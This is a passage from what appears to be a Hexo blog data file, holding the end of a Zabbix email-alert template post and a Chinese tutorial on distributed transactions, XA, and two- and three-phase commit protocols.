class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6062;&#x590D;&#x4E3B;&#x65E8;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x6062;&#x590D;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x6545;&#x969C;&#x3010; {TRIGGER.NAME}&#x3011;&#x5DF2;&#x6062;&#x590D;&#xFF01;</span><br><span class=\"line\"></span><br><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6062;&#x590D;&#x4FE1;&#x606F;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x66F4;&#x6539;&#x540E;&#xFF0C;&#x6536;&#x5230;&#x7684;&#x90AE;&#x4EF6;&#x6837;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/17.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/18.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/19.png\" alt=\"\"></p>"},{"title":"两阶段提交协议、三阶段提交协议","date":"2016-11-11T14:10:00.000Z","_content":"\n### 分布式一致性问题\n\n在分布式系统中，为了保证数据的高可用，通常，我们会将数据保留多个副本(replica)，这些副本会放置在不同的物理的机器上。为了对用户提供正确的增、删、改、查等语义，我们需要保证这些放置在不同物理机器上的副本是一致的。\n\n为了解决这种分布式一致性问题，在性能和数据一致性的反反复复权衡过程中总结了许多典型的协议和算法。**其中比较著名的有二阶提交协议（Two Phase Commitment Protocol）、三阶提交协议（Three Phase Commitment Protocol）和Paxos算法。**\n\n---\n\n### 分布式事务\n\n> 分布式事务是指会涉及到操作多个数据库的事务。其实就是将对同一库事务的概念扩大到了对多个库的事务。目的是为了保证分布式系统中的数据一致性。分布式事务处理的关键是必须有一种方法可以知道事务在任何地方所做的所有动作，提交或回滚事务的决定必须产生统一的结果（全部提交或全部回滚）\n\n如果想让分布式部署的多台机器中的数据保持一致性，那么就要保证在所有节点的数据写操作，要不全部都执行，要么全部的都不执行。但是，一台机器在执行本地事务的时候无法知道其他机器中的本地事务的执行结果。所以他也就不知道本次事务到底应该commit还是 roolback。所以，常规的解决办法就是引入一个“协调者”的组件来统一调度所有分布式节点的执行。\n\n<!-- more -->\n\n---\n\n### XA规范\n\nX/Open 组织（即现在的 Open Group ）定义了分布式事务处理模型。 X/Open DTP 模型（ 1994 ）包括应用程序（ AP ）、事务管理器（ TM ）、资源管理器（ RM ）、通信资源管理器（ CRM ）四部分。一般，常见的事务管理器（ TM ）是交易中间件，常见的资源管理器（ RM ）是数据库，常见的通信资源管理器（ CRM ）是消息中间件。    通常把一个数据库内部的事务处理，如对多个表的操作，作为本地事务看待。数据库的事务处理对象是本地事务，而分布式事务处理的对象是全局事务。   所谓全局事务，是指分布式事务处理环境中，多个数据库可能需要共同完成一个工作，这个工作即是一个全局事务，例如，一个事务中可能更新几个不同的数据库。对数据库的操作发生在系统的各处但必须全部被提交或回滚。此时一个数据库对自己内部所做操作的提交不仅依赖本身操作是否成功，还要依赖与全局事务相关的其它数据库的操作是否成功，如果任一数据库的任一操作失败，则参与此事务的所有数据库所做的所有操作都必须回滚。     一般情况下，某一数据库无法知道其它数据库在做什么，因此，在一个 DTP 环境中，交易中间件是必需的，由它通知和协调相关数据库的提交或回滚。而一个数据库只将其自己所做的操作（可恢复）影射到全局事务中。    \n\nXA 就是 X/Open DTP 定义的交易中间件与数据库之间的接口规范（即接口函数），交易中间件用它来通知数据库事务的开始、结束以及提交、回滚等。 XA 接口函数由数据库厂商提供。 \n\n二阶提交协议和三阶提交协议就是根据这一思想衍生出来的。可以说二阶段提交其实就是实现XA分布式事务的关键(确切地说，两阶段提交主要保证了分布式事务的原子性，即所有结点要么全做要么全不做)\n\n---\n\n### 一阶段提交(Best Efforts 1PC模式)\n\n一阶段提交非常直白，就是从应用程序向数据库发出提交请求到数据库完成提交或回滚之后将结果返回给应用程序的过程。一阶段提交不需要“协调者”角色，各结点之间不存在协调操作，因此其事务执行时间比两阶段提交要短\n\n---\n\n### 二阶段提交(Two-phaseCommit/2PC)\n\n参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要提交操作还是中止操作\n所谓的两个阶段是指：第一阶段：准备阶段(投票阶段)和第二阶段：提交阶段（执行阶段）\n\n#### 准备阶段\n\n1. 协调者节点向所有参与者节点询问是否可以执行提交操作(vote)，并开始等待各参与者节点的响应。\n1. 参与者节点执行询问发起为止的所有事务操作，并将Undo信息和Redo信息写入日志。（注意：若成功这里其实每个参与者已经执行了事务操作）\n1. 各参与者节点响应协调者节点发起的询问。如果参与者节点的事务操作实际执行成功，则它返回一个”同意”消息；如果参与者节点的事务操作实际执行失败，则它返回一个”中止”消息。\n\n#### 提交阶段\n\n1. 协调者节点向所有参与者节点发出”正式提交(commit)”的请求。\n1. 参与者节点正式完成操作，并释放在整个事务期间内占用的资源。\n1. 参与者节点向协调者节点发送”完成”消息。\n1. 协调者节点受到所有参与者节点反馈的”完成”消息后，完成事务。\n\n如果任一参与者节点在第一阶段返回的响应消息为”中止”，或者 协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时\n\n1. 协调者节点向所有参与者节点发出”回滚操作(rollback)”的请求。\n1. 参与者节点利用之前写入的Undo信息执行回滚，并释放在整个事务期间内占用的资源。\n1. 参与者节点向协调者节点发送”回滚完成”消息。\n1. 协调者节点受到所有参与者节点反馈的”回滚完成”消息后，取消事务\n\n不管最后结果如何，第二阶段都会结束当前事务\n\n#### 二阶段存在的问题\n\n1. **同步阻塞问题**。执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态。\n1. **单点故障**。由于协调者的重要性，一旦协调者发生故障。参与者会一直阻塞下去。尤其在第二阶段，协调者发生故障，那么所有的参与者还都处于锁定事务资源的状态中，而无法继续完成事务操作。（如果是协调者挂掉，可以重新选举一个协调者，但是无法解决因为协调者宕机导致的参与者处于阻塞状态的问题）\n1. **数据不一致**。在二阶段提交的阶段二中，当协调者向参与者发送commit请求之后，发生了局部网络异常或者在发送commit请求过程中协调者发生了故障，这回导致只有一部分参与者接受到了commit请求。而在这部分参与者接到commit请求之后就会执行commit操作。但是其他部分未接到commit请求的机器则无法执行事务提交。于是整个分布式系统便出现了数据部一致性的现象。\n1. **二阶段无法解决的问题**：协调者再发出commit消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交\n\n\n---\n\n### 三阶段提交（Three-phase commit/3PC）\n\n<font style=\"color:red;\">改进了两阶段提交,3PC主要解决的单点故障问题，并减少阻塞</font>\n\n- 引入超时机制。同时在协调者和参与者中都引入超时机制。\n- 在第一阶段和第二阶段中插入一个准备阶段。保证了在最后提交阶段之前各参与节点的状态是一致的。\n\n除了引入超时机制之外，3PC把2PC的准备阶段再次一分为二，这样三阶段提交就有CanCommit、PreCommit、DoCommit三个阶段。\n\n#### CanCommit阶段\n\n1. **事务询问** 协调者向参与者发送CanCommit请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应。\n1. **响应反馈** 参与者接到CanCommit请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回Yes响应，并进入预备状态。否则反馈No\n\n#### PreCommit阶段\n\n假如协调者从所有的参与者获得的反馈都是Yes响应，那么就会执行事务的预执行\n\n1. **发送预提交请求** 协调者向参与者发送PreCommit请求，并进入Prepared阶段。\n1. **事务预提交** 参与者接收到PreCommit请求后，会执行事务操作，并将undo和redo信息记录到事务日志中。\n1. **响应反馈** 如果参与者成功的执行了事务操作，则返回ACK响应，同时开始等待最终指令。\n\n假如有任何一个参与者向协调者发送了No响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断。\n\n1. **发送中断请求** 协调者向所有参与者发送abort请求。\n1. **中断事务** 参与者收到来自协调者的abort请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断。\n\n#### doCommit阶段\n\n该阶段进行真正的事务提交，也可以分为以下两种情况\n\n**执行提交**\n\n1. **发送提交请求 **协调接收到参与者发送的ACK响应，那么他将从预提交状态进入到提交状态。并向所有参与者发送doCommit请求。\n1. **事务提交** 参与者接收到doCommit请求之后，执行正式的事务提交。并在完成事务提交之后释放所有事务资源。\n1. **响应反馈** 事务提交完之后，向协调者发送Ack响应。\n1. **完成事务** 协调者接收到所有参与者的ack响应之后，完成事务\n\n**中断事务**\n\n协调者没有接收到参与者发送的ACK响应（可能是接受者发送的不是ACK响应，也可能响应超时），那么就会执行中断事务。\n\n1. **发送中断请求** 协调者向所有参与者发送abort请求\n1. **事务回滚** 参与者接收到abort请求之后，利用其在阶段二记录的undo信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源。\n1. **反馈结果** 参与者完成事务回滚之后，向协调者发送ACK消息\n1. **中断事务** 协调者接收到参与者反馈的ACK消息之后，执行事务的中断\n\n**在doCommit阶段，如果参与者无法及时接收到来自协调者的doCommit或者rebort请求时，会在等待超时之后，会继续进行事务的提交。（其实这个应该是基于概率来决定的，<font style=\"color:red;\">当进入第三阶段时，说明参与者在第二阶段已经收到了PreCommit请求，</font>那么协调者产生PreCommit请求的前提条件是他在第二阶段开始之前，收到所有参与者的CanCommit响应都是Yes。（一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了）所以，一句话概括就是，当进入第三阶段时，由于网络超时等原因，虽然参与者没有收到commit或者abort响应，但是他有理由相信：成功提交的几率很大。 ）**\n\n---\n\n### 2PC与3PC的区别\n\n<font style=\"color:red;\">\n相对于2PC，3PC主要解决的单点故障问题，并减少阻塞，因为一旦参与者无法及时收到来自协调者的信息之后，他会默认执行commit。而不会一直持有事务资源并处于阻塞状态。但是这种机制也会导致数据一致性问题，因为，由于网络原因，协调者发送的abort响应没有及时被参与者接收到，那么参与者在等待超时之后执行了commit操作。这样就和其他接到abort命令并执行回滚的参与者之间存在数据不一致的情况。</font>\n\n---\n\n### 维基百科对2PC和3PC区别的描述\n\n三阶段提交（英语：Three-phase commit），也叫三阶段提交协议（英语：Three-phase commit protocol），是在计算机网络及数据库的范畴下，使得一个分布式系统内的所有节点能够执行事务的提交的一种分布式算法。三阶段提交是为解决两阶段提交协议|的缺点而设计的。\n\n**与两阶段提交不同的是，三阶段提交是“非阻塞”协议。**三阶段提交在两阶段提交的第一阶段与第二阶段之间插入了一个准备阶段，使得原先在两阶段提交中，参与者在投票之后，由于协调者发生崩溃或错误，而导致参与者处于无法知晓是否提交或者中止的“不确定状态”所产生的可能相当长的延时的问题[1]得以解决。 举例来说，假设有一个决策小组由一个主持人负责与多位组员以电话联络方式协调是否通过一个提案，以两阶段提交来说，主持人收到一个提案请求，打电话跟每个组员询问是否通过并统计回复，然后将最后决定打电话通知各组员。要是主持人在跟第一位组员通完电话后失忆，而第一位组员在得知结果并执行后老人痴呆，那么即使重新选出主持人，也没人知道最后的提案决定是什么，也许是通过，也许是驳回，不管大家选择哪一种决定，都有可能与第一位组员已执行过的真实决定不一致，老板就会不开心认为决策小组沟通有问题而解雇。三阶段提交即是引入了另一个步骤，主持人打电话跟组员通知请准备通过提案，以避免没人知道真实决定而造成决定不一致的失业危机。为什么能够解决二阶段提交的问题呢？回到刚刚提到的状况，在主持人通知完第一位组员请准备通过后两人意外失忆，即使没人知道全体在第一阶段的决定为何，全体决策组员仍可以重新协调过程或直接否决，不会有不一致决定而失业。那么当主持人通知完全体组员请准备通过并得到大家的再次确定后进入第三阶段，当主持人通知第一位组员请通过提案后两人意外失忆，这时候其他组员再重新选出主持人后，仍可以知道目前至少是处于准备通过提案阶段，表示第一阶段大家都已经决定要通过了，此时便可以直接通过。\n\n---\n\n### 后记\n了解了2PC和3PC之后，我们可以发现，无论是二阶段提交还是三阶段提交都无法彻底解决分布式的一致性问题。\nGoogle Chubby的作者Mike Burrows说过， **there is only one consensus protocol, and that’s Paxos” – all other approaches are just broken versions of Paxos。** 意即世上只有一种一致性算法，那就是Paxos，所有其他一致性算法都是Paxos算法的不完整版。","source":"_posts/两阶段提交协议、三阶段提交协议.md","raw":"---\ntitle: 两阶段提交协议、三阶段提交协议\ncategories:\n  - 算法及理论\ntags:\n  - 分布式事务\n  - 2pc\n  - 3pc\ndate: 2016-11-11 22:10:00\n\n---\n\n### 分布式一致性问题\n\n在分布式系统中，为了保证数据的高可用，通常，我们会将数据保留多个副本(replica)，这些副本会放置在不同的物理的机器上。为了对用户提供正确的增、删、改、查等语义，我们需要保证这些放置在不同物理机器上的副本是一致的。\n\n为了解决这种分布式一致性问题，在性能和数据一致性的反反复复权衡过程中总结了许多典型的协议和算法。**其中比较著名的有二阶提交协议（Two Phase Commitment Protocol）、三阶提交协议（Three Phase Commitment Protocol）和Paxos算法。**\n\n---\n\n### 分布式事务\n\n> 分布式事务是指会涉及到操作多个数据库的事务。其实就是将对同一库事务的概念扩大到了对多个库的事务。目的是为了保证分布式系统中的数据一致性。分布式事务处理的关键是必须有一种方法可以知道事务在任何地方所做的所有动作，提交或回滚事务的决定必须产生统一的结果（全部提交或全部回滚）\n\n如果想让分布式部署的多台机器中的数据保持一致性，那么就要保证在所有节点的数据写操作，要不全部都执行，要么全部的都不执行。但是，一台机器在执行本地事务的时候无法知道其他机器中的本地事务的执行结果。所以他也就不知道本次事务到底应该commit还是 roolback。所以，常规的解决办法就是引入一个“协调者”的组件来统一调度所有分布式节点的执行。\n\n<!-- more -->\n\n---\n\n### XA规范\n\nX/Open 组织（即现在的 Open Group ）定义了分布式事务处理模型。 X/Open DTP 模型（ 1994 ）包括应用程序（ AP ）、事务管理器（ TM ）、资源管理器（ RM ）、通信资源管理器（ CRM ）四部分。一般，常见的事务管理器（ TM ）是交易中间件，常见的资源管理器（ RM ）是数据库，常见的通信资源管理器（ CRM ）是消息中间件。    通常把一个数据库内部的事务处理，如对多个表的操作，作为本地事务看待。数据库的事务处理对象是本地事务，而分布式事务处理的对象是全局事务。   所谓全局事务，是指分布式事务处理环境中，多个数据库可能需要共同完成一个工作，这个工作即是一个全局事务，例如，一个事务中可能更新几个不同的数据库。对数据库的操作发生在系统的各处但必须全部被提交或回滚。此时一个数据库对自己内部所做操作的提交不仅依赖本身操作是否成功，还要依赖与全局事务相关的其它数据库的操作是否成功，如果任一数据库的任一操作失败，则参与此事务的所有数据库所做的所有操作都必须回滚。     一般情况下，某一数据库无法知道其它数据库在做什么，因此，在一个 DTP 环境中，交易中间件是必需的，由它通知和协调相关数据库的提交或回滚。而一个数据库只将其自己所做的操作（可恢复）影射到全局事务中。    \n\nXA 就是 X/Open DTP 定义的交易中间件与数据库之间的接口规范（即接口函数），交易中间件用它来通知数据库事务的开始、结束以及提交、回滚等。 XA 接口函数由数据库厂商提供。 \n\n二阶提交协议和三阶提交协议就是根据这一思想衍生出来的。可以说二阶段提交其实就是实现XA分布式事务的关键(确切地说，两阶段提交主要保证了分布式事务的原子性，即所有结点要么全做要么全不做)\n\n---\n\n### 一阶段提交(Best Efforts 1PC模式)\n\n一阶段提交非常直白，就是从应用程序向数据库发出提交请求到数据库完成提交或回滚之后将结果返回给应用程序的过程。一阶段提交不需要“协调者”角色，各结点之间不存在协调操作，因此其事务执行时间比两阶段提交要短\n\n---\n\n### 二阶段提交(Two-phaseCommit/2PC)\n\n参与者将操作成败通知协调者，再由协调者根据所有参与者的反馈情报决定各参与者是否要提交操作还是中止操作\n所谓的两个阶段是指：第一阶段：准备阶段(投票阶段)和第二阶段：提交阶段（执行阶段）\n\n#### 准备阶段\n\n1. 协调者节点向所有参与者节点询问是否可以执行提交操作(vote)，并开始等待各参与者节点的响应。\n1. 参与者节点执行询问发起为止的所有事务操作，并将Undo信息和Redo信息写入日志。（注意：若成功这里其实每个参与者已经执行了事务操作）\n1. 各参与者节点响应协调者节点发起的询问。如果参与者节点的事务操作实际执行成功，则它返回一个”同意”消息；如果参与者节点的事务操作实际执行失败，则它返回一个”中止”消息。\n\n#### 提交阶段\n\n1. 协调者节点向所有参与者节点发出”正式提交(commit)”的请求。\n1. 参与者节点正式完成操作，并释放在整个事务期间内占用的资源。\n1. 参与者节点向协调者节点发送”完成”消息。\n1. 协调者节点受到所有参与者节点反馈的”完成”消息后，完成事务。\n\n如果任一参与者节点在第一阶段返回的响应消息为”中止”，或者 协调者节点在第一阶段的询问超时之前无法获取所有参与者节点的响应消息时\n\n1. 协调者节点向所有参与者节点发出”回滚操作(rollback)”的请求。\n1. 参与者节点利用之前写入的Undo信息执行回滚，并释放在整个事务期间内占用的资源。\n1. 参与者节点向协调者节点发送”回滚完成”消息。\n1. 协调者节点受到所有参与者节点反馈的”回滚完成”消息后，取消事务\n\n不管最后结果如何，第二阶段都会结束当前事务\n\n#### 二阶段存在的问题\n\n1. **同步阻塞问题**。执行过程中，所有参与节点都是事务阻塞型的。当参与者占有公共资源时，其他第三方节点访问公共资源不得不处于阻塞状态。\n1. **单点故障**。由于协调者的重要性，一旦协调者发生故障。参与者会一直阻塞下去。尤其在第二阶段，协调者发生故障，那么所有的参与者还都处于锁定事务资源的状态中，而无法继续完成事务操作。（如果是协调者挂掉，可以重新选举一个协调者，但是无法解决因为协调者宕机导致的参与者处于阻塞状态的问题）\n1. **数据不一致**。在二阶段提交的阶段二中，当协调者向参与者发送commit请求之后，发生了局部网络异常或者在发送commit请求过程中协调者发生了故障，这回导致只有一部分参与者接受到了commit请求。而在这部分参与者接到commit请求之后就会执行commit操作。但是其他部分未接到commit请求的机器则无法执行事务提交。于是整个分布式系统便出现了数据部一致性的现象。\n1. **二阶段无法解决的问题**：协调者再发出commit消息之后宕机，而唯一接收到这条消息的参与者同时也宕机了。那么即使协调者通过选举协议产生了新的协调者，这条事务的状态也是不确定的，没人知道事务是否被已经提交\n\n\n---\n\n### 三阶段提交（Three-phase commit/3PC）\n\n<font style=\"color:red;\">改进了两阶段提交,3PC主要解决的单点故障问题，并减少阻塞</font>\n\n- 引入超时机制。同时在协调者和参与者中都引入超时机制。\n- 在第一阶段和第二阶段中插入一个准备阶段。保证了在最后提交阶段之前各参与节点的状态是一致的。\n\n除了引入超时机制之外，3PC把2PC的准备阶段再次一分为二，这样三阶段提交就有CanCommit、PreCommit、DoCommit三个阶段。\n\n#### CanCommit阶段\n\n1. **事务询问** 协调者向参与者发送CanCommit请求。询问是否可以执行事务提交操作。然后开始等待参与者的响应。\n1. **响应反馈** 参与者接到CanCommit请求之后，正常情况下，如果其自身认为可以顺利执行事务，则返回Yes响应，并进入预备状态。否则反馈No\n\n#### PreCommit阶段\n\n假如协调者从所有的参与者获得的反馈都是Yes响应，那么就会执行事务的预执行\n\n1. **发送预提交请求** 协调者向参与者发送PreCommit请求，并进入Prepared阶段。\n1. **事务预提交** 参与者接收到PreCommit请求后，会执行事务操作，并将undo和redo信息记录到事务日志中。\n1. **响应反馈** 如果参与者成功的执行了事务操作，则返回ACK响应，同时开始等待最终指令。\n\n假如有任何一个参与者向协调者发送了No响应，或者等待超时之后，协调者都没有接到参与者的响应，那么就执行事务的中断。\n\n1. **发送中断请求** 协调者向所有参与者发送abort请求。\n1. **中断事务** 参与者收到来自协调者的abort请求之后（或超时之后，仍未收到协调者的请求），执行事务的中断。\n\n#### doCommit阶段\n\n该阶段进行真正的事务提交，也可以分为以下两种情况\n\n**执行提交**\n\n1. **发送提交请求 **协调接收到参与者发送的ACK响应，那么他将从预提交状态进入到提交状态。并向所有参与者发送doCommit请求。\n1. **事务提交** 参与者接收到doCommit请求之后，执行正式的事务提交。并在完成事务提交之后释放所有事务资源。\n1. **响应反馈** 事务提交完之后，向协调者发送Ack响应。\n1. **完成事务** 协调者接收到所有参与者的ack响应之后，完成事务\n\n**中断事务**\n\n协调者没有接收到参与者发送的ACK响应（可能是接受者发送的不是ACK响应，也可能响应超时），那么就会执行中断事务。\n\n1. **发送中断请求** 协调者向所有参与者发送abort请求\n1. **事务回滚** 参与者接收到abort请求之后，利用其在阶段二记录的undo信息来执行事务的回滚操作，并在完成回滚之后释放所有的事务资源。\n1. **反馈结果** 参与者完成事务回滚之后，向协调者发送ACK消息\n1. **中断事务** 协调者接收到参与者反馈的ACK消息之后，执行事务的中断\n\n**在doCommit阶段，如果参与者无法及时接收到来自协调者的doCommit或者rebort请求时，会在等待超时之后，会继续进行事务的提交。（其实这个应该是基于概率来决定的，<font style=\"color:red;\">当进入第三阶段时，说明参与者在第二阶段已经收到了PreCommit请求，</font>那么协调者产生PreCommit请求的前提条件是他在第二阶段开始之前，收到所有参与者的CanCommit响应都是Yes。（一旦参与者收到了PreCommit，意味他知道大家其实都同意修改了）所以，一句话概括就是，当进入第三阶段时，由于网络超时等原因，虽然参与者没有收到commit或者abort响应，但是他有理由相信：成功提交的几率很大。 ）**\n\n---\n\n### 2PC与3PC的区别\n\n<font style=\"color:red;\">\n相对于2PC，3PC主要解决的单点故障问题，并减少阻塞，因为一旦参与者无法及时收到来自协调者的信息之后，他会默认执行commit。而不会一直持有事务资源并处于阻塞状态。但是这种机制也会导致数据一致性问题，因为，由于网络原因，协调者发送的abort响应没有及时被参与者接收到，那么参与者在等待超时之后执行了commit操作。这样就和其他接到abort命令并执行回滚的参与者之间存在数据不一致的情况。</font>\n\n---\n\n### 维基百科对2PC和3PC区别的描述\n\n三阶段提交（英语：Three-phase commit），也叫三阶段提交协议（英语：Three-phase commit protocol），是在计算机网络及数据库的范畴下，使得一个分布式系统内的所有节点能够执行事务的提交的一种分布式算法。三阶段提交是为解决两阶段提交协议|的缺点而设计的。\n\n**与两阶段提交不同的是，三阶段提交是“非阻塞”协议。**三阶段提交在两阶段提交的第一阶段与第二阶段之间插入了一个准备阶段，使得原先在两阶段提交中，参与者在投票之后，由于协调者发生崩溃或错误，而导致参与者处于无法知晓是否提交或者中止的“不确定状态”所产生的可能相当长的延时的问题[1]得以解决。 举例来说，假设有一个决策小组由一个主持人负责与多位组员以电话联络方式协调是否通过一个提案，以两阶段提交来说，主持人收到一个提案请求，打电话跟每个组员询问是否通过并统计回复，然后将最后决定打电话通知各组员。要是主持人在跟第一位组员通完电话后失忆，而第一位组员在得知结果并执行后老人痴呆，那么即使重新选出主持人，也没人知道最后的提案决定是什么，也许是通过，也许是驳回，不管大家选择哪一种决定，都有可能与第一位组员已执行过的真实决定不一致，老板就会不开心认为决策小组沟通有问题而解雇。三阶段提交即是引入了另一个步骤，主持人打电话跟组员通知请准备通过提案，以避免没人知道真实决定而造成决定不一致的失业危机。为什么能够解决二阶段提交的问题呢？回到刚刚提到的状况，在主持人通知完第一位组员请准备通过后两人意外失忆，即使没人知道全体在第一阶段的决定为何，全体决策组员仍可以重新协调过程或直接否决，不会有不一致决定而失业。那么当主持人通知完全体组员请准备通过并得到大家的再次确定后进入第三阶段，当主持人通知第一位组员请通过提案后两人意外失忆，这时候其他组员再重新选出主持人后，仍可以知道目前至少是处于准备通过提案阶段，表示第一阶段大家都已经决定要通过了，此时便可以直接通过。\n\n---\n\n### 后记\n了解了2PC和3PC之后，我们可以发现，无论是二阶段提交还是三阶段提交都无法彻底解决分布式的一致性问题。\nGoogle Chubby的作者Mike Burrows说过， **there is only one consensus protocol, and that’s Paxos” – all other approaches are just broken versions of Paxos。** 意即世上只有一种一致性算法，那就是Paxos，所有其他一致性算法都是Paxos算法的不完整版。","slug":"两阶段提交协议、三阶段提交协议","published":1,"updated":"2016-11-20T10:45:55.966Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulde003qgwtmoiahvos9","content":"<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;</h3><p>&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x901A;&#x5E38;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x7559;&#x591A;&#x4E2A;&#x526F;&#x672C;(replica)&#xFF0C;&#x8FD9;&#x4E9B;&#x526F;&#x672C;&#x4F1A;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x4E3A;&#x4E86;&#x5BF9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6B63;&#x786E;&#x7684;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x7B49;&#x8BED;&#x4E49;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x8FD9;&#x4E9B;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7269;&#x7406;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x526F;&#x672C;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;</p>\n<p>&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6027;&#x80FD;&#x548C;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x53CD;&#x53CD;&#x590D;&#x590D;&#x6743;&#x8861;&#x8FC7;&#x7A0B;&#x4E2D;&#x603B;&#x7ED3;&#x4E86;&#x8BB8;&#x591A;&#x5178;&#x578B;&#x7684;&#x534F;&#x8BAE;&#x548C;&#x7B97;&#x6CD5;&#x3002;<strong>&#x5176;&#x4E2D;&#x6BD4;&#x8F83;&#x8457;&#x540D;&#x7684;&#x6709;&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Two Phase Commitment Protocol&#xFF09;&#x3001;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Three Phase Commitment Protocol&#xFF09;&#x548C;Paxos&#x7B97;&#x6CD5;&#x3002;</strong></p>\n<hr>\n<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;</h3><blockquote>\n<p>&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x662F;&#x6307;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5C06;&#x5BF9;&#x540C;&#x4E00;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x6982;&#x5FF5;&#x6269;&#x5927;&#x5230;&#x4E86;&#x5BF9;&#x591A;&#x4E2A;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5173;&#x952E;&#x662F;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4